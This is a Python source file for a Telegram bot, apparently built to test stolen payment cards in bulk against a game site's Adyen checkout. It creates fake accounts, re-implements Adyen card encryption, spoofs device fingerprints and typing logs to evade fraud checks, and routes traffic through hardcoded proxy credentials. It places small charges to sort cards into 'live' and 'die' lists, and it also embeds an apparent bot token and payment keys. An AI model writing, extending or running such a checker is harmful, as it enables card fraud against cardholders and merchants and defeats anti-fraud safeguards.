import logging
import sys
import re
import os
import json
import hmac
import hashlib
import base64
import time
import asyncio
import random
import string
import psutil
from datetime import datetime

# Thư viện Telegram
from telegram import Update, InputFile
from telegram.ext import ApplicationBuilder, ContextTypes, CommandHandler, MessageHandler, filters

# Import curl_cffi
try:
    from curl_cffi.requests import AsyncSession
except ImportError:
    print("Thiếu thư viện curl_cffi! Vui lòng chạy: pip install curl_cffi")
    sys.exit()

# Thư viện mã hóa
try:
    from Cryptodome.PublicKey import RSA
    from Cryptodome.Cipher import PKCS1_OAEP, AES
    from Cryptodome.Util.Padding import pad
    from jose import jwk
except ImportError:
    print("Thiếu thư viện crypto! Vui lòng chạy: pip install pycryptodomex python-jose")
    sys.exit()

# ===================================================================
# === CẤU HÌNH GLOBAL & PROXY
# ===================================================================

# Token Telegram (THAY THẾ BẰNG TOKEN CỦA BẠN)
BOT_TOKEN = "8414556300:AAGs-pW76xOmEzi-SbLcHDaUOiUXtYpBq_0"

# Cấu hình Proxy cứng từ yêu cầu
PROXY_STR = "asg.360s5.com:3600:88634867-zone-custom-region-SG:AetOKcLB"
p_host, p_port, p_user, p_pass = PROXY_STR.split(":")
PROXY_URL = f"http://{p_user}:{p_pass}@{p_host}:{p_port}"

PROXIES_CONFIG = {
    "http": PROXY_URL,
    "https": PROXY_URL
}

# Các key cấu hình (GIỮ NGUYÊN)
ADYEN_KEY = "10001|98BA34B1675D6C2540AC464A37D0F13CBF019896E8B889F387C1481F69B1E6041A6A2D2EC48F6496619641447BE2F2A4ACBCC4AA8F51FDF0F9DD2ABE6D5C41FB8AD54DF47980A6F90C273D549BBF6A2DADF8A9B12D269C1C73BB5E48C931AB8F4C3E1A5666F85D73FDE2A99DA0BD3C152B5AA4D538EA9A922FA8FCA01B6C176CDB2922FFAA3052651BA456E4FF7D8B010549BCDC4357EDD1FFE3D1111281BD4C1BDE53562960B3BB81CF5C4F2EC3EEA6888FC9598524E5C327336AE5DEACE77983FF804CFC0FC83A2B6FECBD1F024651598E8D556ED341A0F0C58C997A8837154C76226D76D6B4D2D3EA3C5FAE83AFF395F0BA5675EB3789C11C8718699E5E43"
STRIPE_KEY = "live_4TWKSNW445CGJJGVPEWXKHDAGMMTXVQT"
DOMAIN_URL = "https://taongafarm.com"

# Logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)

# ===================================================================
# === PHẦN 1: THUẬT TOÁN MÃ HÓA ADYEN 4.8.0 (GIỮ NGUYÊN)
# ===================================================================

def get_current_timestamp():
    return datetime.utcnow().isoformat() + 'Z'

def w(e):
    t = e
    if isinstance(t, str):
        t = t.encode('utf-8')
    return base64.b64encode(t).decode('utf-8')

def _(e):
    return w(e).replace('=', '').replace('+', '-').replace('/', '_')

def k(e):
    if not e:
        return bytearray(0)
    if len(e) % 2 == 1:
        e = "0" + e
    t = len(e) // 2
    r = bytearray(t)
    for n in range(t):
        r[n] = int(e[n*2:n*2+2], 16)
    return r

bt = 2**32

def mt(e, t, r):
    if not (0 <= t < bt):
        raise ValueError(f"value must be >= 0 and <= {bt - 1}. Received {t}")
    e[r:r+4] = [(t >> 24) & 0xff, (t >> 16) & 0xff, (t >> 8) & 0xff, t & 0xff]

class AdyenV4_8_0:
    def __init__(self, site_key):
        self.site_key = site_key
        self.key_object = None

    def generate_key(self):
        parts = self.site_key.split("|")
        if len(parts) != 2:
            raise ValueError("Malformed public key")
        part1 = parts[0]
        part2 = parts[1]
        decoded_part1 = k(part1)
        decoded_part2 = k(part2)
        encoded_part1 = _(decoded_part1)
        encoded_part2 = _(decoded_part2)

        self.key_object = {
            "kty": "RSA",
            "kid": "asf-key",
            "e": encoded_part1,
            "n": encoded_part2,
            "alg": "RSA-OAEP",
        }
        return self.key_object

    def encrypt_data(self, plain_text):
        public_key = jwk.construct(self.key_object)
        pem = public_key.to_pem().decode('utf-8')
        rsa_key = RSA.import_key(pem)
        random_bytes = os.urandom(64)
        cipher_rsa = PKCS1_OAEP.new(rsa_key)
        encrypted_key = cipher_rsa.encrypt(random_bytes)
        cek = random_bytes
        protected_header = {"alg":"RSA-OAEP","enc":"A256CBC-HS512","version":"1"}
        protected_header_b64 = _(json.dumps(protected_header).encode('utf-8'))
        _iv = os.urandom(16)
        _plaintext = json.dumps(plain_text).encode('utf-8')
        aes_key = cek[32:]
        hmac_key = cek[:32]
        cipher_aes = AES.new(aes_key, AES.MODE_CBC, _iv)
        padded_plaintext = pad(_plaintext, AES.block_size)
        ciphertext = cipher_aes.encrypt(padded_plaintext)
        protected_header2_bytes = protected_header_b64.encode('utf-8')
        f = len(protected_header2_bytes) * 8
        d = f // bt
        h_val = f % bt
        y = bytearray(8)
        mt(y, d, 0)
        mt(y, h_val, 4)
        hmac_obj = hmac.new(hmac_key, digestmod=hashlib.sha512)
        hmac_obj.update(protected_header2_bytes + _iv + ciphertext + y)
        tag = hmac_obj.digest()[:32]
        return f"{protected_header_b64}.{_(encrypted_key)}.{_(_iv)}.{_(ciphertext)}.{_(tag)}"

def format_card_number(card):
    return ' '.join(card[i:i+4] for i in range(0, len(card), 4))

def encrypt_card_data_480(card, month, year, cvc, adyen_key, stripe_key=None, domain=None):
    if not stripe_key: stripe_key = "live_2WKDYLJCMBFC5CFHBXY2CHZF4MUUJ7QU"
    if not domain: domain = "https://taongafarm.com"
    domain_b64 = base64.b64encode(domain.encode('utf-8')).decode('utf-8')
    referrer = f"https://checkoutshopper-live.adyen.com/checkoutshopper/securedfields/{stripe_key}/5.5.3/securedFields.html?type=card&d={domain_b64}"
    card_number = format_card_number(card)
    card_detail = {
        "encryptedCardNumber": {"number": card_number, "generationtime": get_current_timestamp(), "numberBind": "1", "activate": "3", "referrer": referrer, "numberFieldFocusCount": "3", "numberFieldLog": "fo@44070,cl@44071,KN@44082,fo@44324,cl@44325,cl@44333,KN@44346,KN@44347,KN@44348,KN@44350,KN@44351,KN@44353,KN@44354,KN@44355,KN@44356,KN@44358,fo@44431,cl@44432,KN@44434,KN@44436,KN@44438,KN@44440,KN@44440", "numberFieldClickCount": "4", "numberFieldKeyCount": "16"},
        "encryptedExpiryMonth": {"expiryMonth": month, "generationtime": get_current_timestamp()},
        "encryptedExpiryYear": {"expiryYear": year, "generationtime": get_current_timestamp()},
        "encryptedSecurityCode": {"cvc": cvc, "generationtime": get_current_timestamp(), "cvcBind": "1", "activate": "4", "referrer": referrer, "cvcFieldFocusCount": "4", "cvcFieldLog": "fo@122,cl@123,KN@136,KN@138,KN@140,fo@11204,cl@11205,ch@11221,bl@11221,fo@33384,bl@33384,fo@50318,cl@50319,cl@50321,KN@50334,KN@50336,KN@50336", "cvcFieldClickCount": "4", "cvcFieldKeyCount": "6", "cvcFieldChangeCount": "1", "cvcFieldBlurCount": "2", "deactivate": "2"}
    }
    adyen_encryptor = AdyenV4_8_0(adyen_key)
    adyen_encryptor.generate_key()
    encrypted_details = {}
    for key, value in card_detail.items():
        encrypted_details[key] = adyen_encryptor.encrypt_data(value)
    return encrypted_details

# ===================================================================
# === PHẦN 2: HELPER FUNCTIONS (GIỮ NGUYÊN)
# ===================================================================

def normalize_card(card_str):
    pattern = r'(\d{13,19})[|/:](\d{1,2})[|/:](\d{2,4})[|/:](\d{3,4})'
    match = re.search(pattern, card_str)
    if not match: return None
    card_num, month, year, cvv = match.groups()
    month = month.zfill(2)
    if len(year) == 2: year = '20' + year
    return f"{card_num}|{month}|{year}|{cvv}"

def validate_luhn(card_number):
    card_num = ''.join(filter(str.isdigit, str(card_number)))
    if not card_num or len(card_num) < 13 or len(card_num) > 19: return False
    total = 0
    reverse_digits = card_num[::-1]
    for i, digit in enumerate(reverse_digits):
        n = int(digit)
        if i % 2 == 1:
            n = n * 2
            if n > 9: n = n - 9
        total += n
    return total % 10 == 0

def get_short_brand_name(cc):
    first_digit = cc[0]
    if first_digit in ['5', '2']: return 'mc'
    elif first_digit == '4': return 'visa'
    elif cc.startswith(('34', '37')): return 'amex'
    elif cc.startswith(('60', '64', '65')): return 'discover'
    elif cc.startswith('62'): return 'cup'
    elif cc.startswith('35'): return 'jcb'
    elif cc.startswith(('30', '36', '38')): return 'diners'
    elif cc.startswith('67'): return 'maestro'
    else: return 'unknown'

def generate_random_email():
    names = ["nguyenvan", "minhquan", "anhtuan", "anhduc", "quanghuy", "hoangnam", "phuocloc", "huyhoang", "vanthanh", "theanh", "ngocanh", "thuylinh", "quynhanh", "phuongthao", "kimngan", "thuytien", "minhthu", "lananh", "hoangyen", "phatphat", "namnam", "linhlinh", "anhyeu", "cuongpro", "minhvip", "datcute", "huydz", "tuananh199"]
    name = random.choice(names)
    random_str = ''.join(random.choices(string.digits, k=3))
    return f"{name}{random_str}@gmail.com"

def generate_dadus():
    user = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    json_string = f'{{"version":"1.0.0","deviceFingerprint":"1N39KVvVK8itaGr7odbrTKnBdbwt4n7PoYuk0009040344c{random.randint(100, 999)}iKzBGcrkpIQWp4A1B2M2Y8Asg0004erXqCOncs{random.randint(1000, 9909)}uFhJE00000WIL1VQ3oQKRWT1eb85Gu:40","persistentCookie":[],"components":{{"userAgent":"{user}","webdriver":0,"language":"vi-VN","colorDepth":24,"deviceMemory":8,"pixelRatio":1.25,"hardwareConcurrency":12,"screenWidth":2048,"screenHeight":1152,"availableScreenWidth":2048,"availableScreenHeight":1104,"timezoneOffset":-420,"timezone":"Asia/Bangkok","sessionStorage":1,"localStorage":1,"indexedDb":1,"addBehavior":0,"openDatabase":0,"platform":"Win32","plugins":"29cf71e3d81d74d43a5b0eb79405ba87","canvas":"a4375f9f6804450aa47496883e844553","webgl":"e05e860022c830166bcb93b7a3775148","webglVendorAndRenderer":"Google Inc. (NVIDIA)~ANGLE (NVIDIA, NVIDIA GeForce RTX 2060 (0x00001F08) Direct3D11 vs_5_0 ps_5_0, D3D11)","adBlock":0,"hasLiedLanguages":0,"hasLiedResolution":0,"hasLiedOs":1,"hasLiedBrowser":0,"fonts":"41c37ee7a27152ed8fa4b3e6f2348b1b","audio":"902f0fe98719b779ea37f27528dfb0aa","enumerateDevices":"5f3fdaf4743eaa707ca6b7da65603892"}}}}'
    return base64.b64encode(json_string.encode('utf-8')).decode('utf-8')

# ===================================================================
# === PHẦN 3: XỬ LÝ CARD VÀ THÔNG TIN BIN
# ===================================================================

async def get_bin_info(session, cc_num):
    try:
        url = f"https://bins.antipublic.cc/bins/{cc_num}"
        resp = await session.get(url, timeout=10)
        if resp.status_code == 200:
            data = resp.json()
            return f"{data.get('brand','N/A')} - {data.get('country_name','N/A')} - {data.get('bank','N/A')} - {data.get('level','N/A')} - {data.get('type','N/A')}"
        else:
            return "BIN N/A"
    except Exception:
        return "BIN ERROR"

async def check_card_core(line, price_val=1.99, offer_id=38334, session_semaphore=None):
    """Core logic xử lý thẻ, trả về kết quả cấu trúc để bot xử lý"""
    start_time = time.time()
    line = line.strip()
    
    # Kết quả mặc định
    result = {
        "status": "ERROR",
        "msg": "Invalid Format",
        "full_log": line,
        "is_live": False
    }

    if not line: return result
    
    normalized = normalize_card(line)
    if not normalized:
        return result

    cc, mm, yyyy, cvc = normalized.split('|')
    
    if not validate_luhn(cc):
        result["msg"] = "Luhn Fail"
        return result

    # Nếu có semaphore (chạy file) thì dùng, không thì chạy thẳng (lệnh /st)
    if session_semaphore:
        async with session_semaphore:
            return await _execute_check(cc, mm, yyyy, cvc, price_val, offer_id, start_time)
    else:
        return await _execute_check(cc, mm, yyyy, cvc, price_val, offer_id, start_time)

async def _execute_check(cc, mm, yyyy, cvc, price_val, offer_id, start_time):
    retry_count = 0
    max_retries = 20
    impersonate_ver = "chrome120"
    
    final_res = {"status": "UNK", "is_live": False, "full_log": ""}

    while retry_count < max_retries:
        try:
            async with AsyncSession(impersonate=impersonate_ver, proxies=PROXIES_CONFIG, verify=False) as session:
                # --- BƯỚC 1: LẤY TOKEN ---
                reg_headers = {'accept': '*/*', 'referer': 'https://taongafarm.com/en/'}
                resp_token = await session.get('https://taongafarm.com/api/token.js', headers=reg_headers, timeout=15)
                match = re.search(r"window\.csrftoken='([^']+)'", resp_token.text)
                if not match:
                    retry_count += 1
                    continue
                
                token = match.group(1)
                session.cookies.set('_csrf', token, domain='taongafarm.com')

                # --- BƯỚC 2: ĐĂNG KÝ ---
                current_email = generate_random_email()
                reg_data = {
                    'email': current_email, 'password': 'Minhnhat@@123',
                    'register_info': {
                        'device': {}, 'lang': 'en', 
                        'nav': {'cookieEnabled': True, 'platform': 'Win32', 'userAgent': 'Mozilla/5.0'}, 
                        'ref': 'direct', 'referrer': '', 'url': '/en/', 'urlarg': {}
                    },
                    'skip_email_validation': False, 'user_agree_terms': True,
                }
                api_headers = reg_headers.copy()
                api_headers.update({'x-csrf-token': token, 'content-type': 'application/json'})
                
                resp_reg = await session.post('https://taongafarm.com/api/login/signup', headers=api_headers, json=reg_data, timeout=15)
                if 'session_portal' not in session.cookies.get_dict():
                    retry_count += 1
                    continue

                # --- BƯỚC 3: MÃ HÓA ---
                encrypted_data = encrypt_card_data_480(cc, mm, yyyy, cvc, ADYEN_KEY, STRIPE_KEY, DOMAIN_URL)

                # --- BƯỚC 4: THANH TOÁN ---
                payment_headers = {
                    'content-type': 'application/json',
                    'origin': 'https://taongafarm.com',
                    'referer': 'https://taongafarm.com/en/payment/adyen/checkout/',
                }
                payment_json_data = {
                    'paymentRequest': {
                        'riskData': {'clientData': generate_dadus()},
                        'paymentMethod': {
                            'type': 'scheme', 'holderName': '',
                            'encryptedCardNumber': encrypted_data['encryptedCardNumber'],
                            'encryptedExpiryMonth': encrypted_data['encryptedExpiryMonth'],
                            'encryptedExpiryYear': encrypted_data['encryptedExpiryYear'],
                            'encryptedSecurityCode': encrypted_data['encryptedSecurityCode'],
                            'brand': get_short_brand_name(cc),
                            'checkoutAttemptId': 'fetch-checkoutAttemptId-failed',
                        },
                        'storePaymentMethod': False,
                        'browserInfo': {'acceptHeader': '*/*', 'colorDepth': 24, 'language': 'vi-VN', 'javaEnabled': False, 'screenHeight': 1152, 'screenWidth': 2048, 'userAgent': 'Mozilla/5.0', 'timeZoneOffset': -420, 'origin': 'https://taongafarm.com'},
                        'clientStateDataIndicator': True,
                    },
                    'checkoutRequest': {
                        'countryCodeFallback': 'GB', 'email': current_email,
                        'gameLanguage': 'en', 'gameLocale': 'en_US', 
                        'offerId': offer_id, 'platformId': '70345744830530987221', 
                        'platformType': 'portal', 'priceCurrency': 'USD', 'priceValue': price_val, 'quantity': 1,
                    },
                    'browserInfo': {'acceptHeader': '*/*', 'userAgent': 'Mozilla/5.0', 'language': 'en-US'},
                    'billingInfo': {'countryCode': 'US', 'postalCode': '53227'},
                }

                resp_pay = await session.post('https://taongafarm.com/payment/adyen/api/checkout/payment', headers=payment_headers, json=payment_json_data, timeout=20)
                try:
                    data = resp_pay.json()
                except:
                    retry_count += 1
                    continue

                # --- PHÂN TÍCH KẾT QUẢ ---
                additionalData = data.get('additionalData', {})
                cvcResultRaw = additionalData.get('cvcResultRaw', 'N/A')
                cvcResult = additionalData.get('cvcResult', 'N/A')
                avsResultRaw = additionalData.get('avsResultRaw', 'N/A')
                avsResult = additionalData.get('avsResult', 'N/A')
                resultCode = data.get('resultCode', additionalData.get('resultCode', 'N/A'))
                refusalReason = data.get('refusalReason', additionalData.get('refusalReason', 'N/A'))
                refusalReasonRaw = additionalData.get('refusalReasonRaw', 'N/A')

                bin_info_str = await get_bin_info(session, cc)
                
                if resultCode == "Authorised":
                    status = "APPROVED"
                    msg = f"APPROVED {price_val}$ - CHARGED"
                    is_live = True
                elif resultCode == "Refused":
                    status = "DECLINED"
                    msg = f"DIE - {refusalReason}"
                    is_live = False
                else:
                    status = "UNK"
                    msg = f"UNK - {data.get('message', resultCode)}"
                    is_live = False

                end_time = time.time()
                time_taken = round(end_time - start_time, 2)

                log_str = f"{cc}|{mm}|{yyyy}|{cvc}|{cvcResultRaw}|{cvcResult}|{avsResultRaw}|{avsResult}|{resultCode}|{refusalReasonRaw}|{msg} - [{bin_info_str}] - Time: {time_taken}s"

                return {
                    "status": status,
                    "is_live": is_live,
                    "full_log": log_str,
                    "bin_info": bin_info_str # Dùng riêng cho chế độ /st
                }

        except Exception:
            retry_count += 1
            await asyncio.sleep(0.5)
            continue

    return {"status": "ERROR", "is_live": False, "full_log": f"{cc}|...|ERROR|Timeout or Network Error"}

# ===================================================================
# === PHẦN 4: BOT COMMAND HANDLERS
# ===================================================================

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🤖 **Taonga Payment Bot**\n\n"
        "1. Gửi file `.txt` (list thẻ) để check hàng loạt (100 luồng).\n"
        "2. Dùng lệnh `/st <cc>` để check lẻ.\n"
        "3. Realtime Report: CPU, RAM, CPM.\n\n"
        "Ready!"
    )

async def single_check_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Xử lý lệnh /st"""
    try:
        args = context.args
        if not args:
            await update.message.reply_text("⚠️ Vui lòng nhập list. Ví dụ: `/st 4444...|12|24|123`")
            return

        card_data = args[0]
        msg = await update.message.reply_text(f"⏳ Đang check: {card_data}")
        
        # Chạy check
        result = await check_card_core(card_data)
        
        # Format đặc biệt cho /st: BIN xuống dòng
        if "full_log" in result and "bin_info" in result:
             # Tách log gốc để lấy phần đầu, sau đó ghép lại theo format /st yêu cầu
             # Format gốc: ...|MSG - [BIN INFO] - Time...
             # Ta cần xuống dòng chỗ BIN INFO
             base_log = result['full_log'].split(" - [")[0] # Lấy phần info thẻ và msg
             bin_info = result['bin_info']
             time_str = result['full_log'].split("] - ")[-1]
             
             formatted_response = f"💳 Card: `{card_data}`\n" \
                                  f"ℹ️ Status: {base_log}\n" \
                                  f"🏦 Bin: {bin_info}\n" \
                                  f"⏱ {time_str}"
        else:
             formatted_response = result['full_log']

        await msg.edit_text(formatted_response)

    except Exception as e:
        await update.message.reply_text(f"Lỗi: {str(e)}")

# Class chứa trạng thái của process
class CheckStats:
    def __init__(self):
        self.total = 0
        self.checked = 0
        self.live = 0
        self.die = 0
        self.error = 0
        self.start_time = time.time()
        self.is_running = True

async def file_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Xử lý file upload"""
    document = update.message.document
    if not document.file_name.endswith('.txt'):
        await update.message.reply_text("❌ Chỉ nhận file .txt")
        return

    # Tải file về
    file = await context.bot.get_file(document.file_id)
    file_content = await file.download_as_bytearray()
    lines = file_content.decode('utf-8').splitlines()
    lines = [l.strip() for l in lines if l.strip()]
    
    total_cards = len(lines)
    if total_cards == 0:
        await update.message.reply_text("❌ File rỗng.")
        return

    # Khởi tạo stats
    stats = CheckStats()
    stats.total = total_cards
    
    status_msg = await update.message.reply_text(
        f"🚀 **Đang khởi động 100 luồng...**\n"
        f"Tổng: {total_cards} thẻ."
    )

    # Chuẩn bị file kết quả tạm
    chat_id = update.effective_chat.id
    live_file = f"live_{chat_id}.txt"
    die_file = f"die_{chat_id}.txt"
    
    # Xóa file cũ nếu tồn tại
    if os.path.exists(live_file): os.remove(live_file)
    if os.path.exists(die_file): os.remove(die_file)

    # Semaphore 100 luồng
    semaphore = asyncio.Semaphore(20)
    
    # Task update UI background
    async def update_ui_loop():
        while stats.is_running and stats.checked < stats.total:
            await asyncio.sleep(1.5) # Update mỗi 1.5s để tránh flood
            elapsed = time.time() - stats.start_time
            cpm = int((stats.checked / elapsed) * 60) if elapsed > 0 else 0
            
            # System info
            cpu = psutil.cpu_percent()
            ram = psutil.virtual_memory().percent
            
            text = (
                f"⚡ **Checking in Progress...**\n"
                f"Total: {stats.total}\n"
                f"✅ Live: {stats.live} | ❌ Die: {stats.die} | ⚠️ Error: {stats.error}\n"
                f"Checked: {stats.checked}/{stats.total}\n"
                f"🚀 CPM: {cpm}\n"
                f"🖥 CPU: {cpu}% | RAM: {ram}%"
            )
            try:
                await status_msg.edit_text(text)
            except:
                pass 

    ui_task = asyncio.create_task(update_ui_loop())

    # Worker xử lý từng line
    async def worker(line):
        res = await check_card_core(line, session_semaphore=semaphore)
        stats.checked += 1
        
        if res["is_live"]:
            stats.live += 1
            with open(live_file, "a", encoding="utf-8") as f:
                f.write(res["full_log"] + "\n")
        else:
            if res["status"] == "ERROR":
                stats.error += 1
            else:
                stats.die += 1
            with open(die_file, "a", encoding="utf-8") as f:
                f.write(res["full_log"] + "\n")
    
    # Chạy tasks
    tasks = [worker(line) for line in lines]
    await asyncio.gather(*tasks)

    # Kết thúc
    stats.is_running = False
    await ui_task # Chờ update cuối

    # Gửi kết quả
    await update.message.reply_text("✅ **Hoàn tất! Đang gửi file...**")
    
    if os.path.exists(live_file):
        await update.message.reply_document(document=InputFile(live_file), caption=f"✅ Live Cards ({stats.live})")
        os.remove(live_file)
    else:
        await update.message.reply_text("Không có thẻ Live.")

    if os.path.exists(die_file):
        await update.message.reply_document(document=InputFile(die_file), caption=f"❌ Die/Error Cards ({stats.die + stats.error})")
        os.remove(die_file)

# ===================================================================
# === MAIN
# ===================================================================

if __name__ == '__main__':
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(CommandHandler("st", single_check_command))
    app.add_handler(MessageHandler(filters.Document.ALL, file_handler))
    
    print("Bot đang chạy...")
    app.run_polling()
